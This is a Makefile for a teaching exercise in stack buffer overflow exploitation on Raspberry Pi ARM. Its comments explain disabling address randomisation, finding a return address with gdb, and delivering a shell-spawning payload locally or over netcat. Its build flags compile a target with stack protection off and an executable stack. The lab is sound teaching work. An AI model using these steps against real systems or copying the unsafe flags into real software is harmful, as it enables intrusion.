
# (c) 2004, 2017 Maurizio Pizzonia for didactic purposes - 

# orgininally written for debian sarge 
# gcc version 3.3.5 (Debian 1:3.3.5-13)
# Linux pisolo 2.6.9pizzo4beta #3 Sat Dec 18 19:12:20 CET 2004 i686 GNU/Linux
#
# /proc/sys/kernel# echo 0 > randomize_va_space
# otherwise the attack is much more complicated
#
#
# make RP=0xbffff700 exploit
#
# to find RP value run once with 'ulimit -c unlimited' 
# and look for a right address with 
#  gdb -c core 
#  disass 0xbffff600 0xbffff800         # around the one you tried
#   
#  look for and address right in the middle of your nop sequence.
#
# ========= local attack 
# $ target < gun
#
# ========= remote attack
# server$ nc -l -p 5000 -c ./main
# client$ cat exploit | netcat localhost 5000
# 
#  

# 2023 ARM porting on RaspberryPi4 (same .S for rpi3)
# Fabrizio Andreoli
#
# On my Raspberry pi 3 and 4, nc is without -c option
# So installed nc6 on both.
# I modified target.c to print buffer's address, and the first
# 1773 bytes pointed by this address, just after scanf()...
#
# ./disable_randomize_va_space
# make RP=0xbefff600 all
# ./target
# ========= Verify that printed buffer's address is "right" for
# ========= choosen RP: falls on NOP area (0xe1a00000).
# ========= Else make with different RP.
# ./target < exploit
#
# ========= client on another local terminal
# nc6 localhost 7000
#

rpi = _rpi4

.PHONY: runshell_arm exploit

all: exploit target

runshell_arm: runshell_arm.S
	as -defsym fakerp=$(RP) -o $@$(rpi).o $? -k

exploit: runshell_arm
	set PYTHONIOENCODING="latin-1"
	objdump --section=.data -s runshell_arm$(rpi).o |\
	tail -n +5 | cut -c 7-41 | ./hex2echo >$@

CFLAGS=-g -Wl,-z,norelro -fno-stack-protector -z execstack
target: target.c
# using implicit C compilation rules of make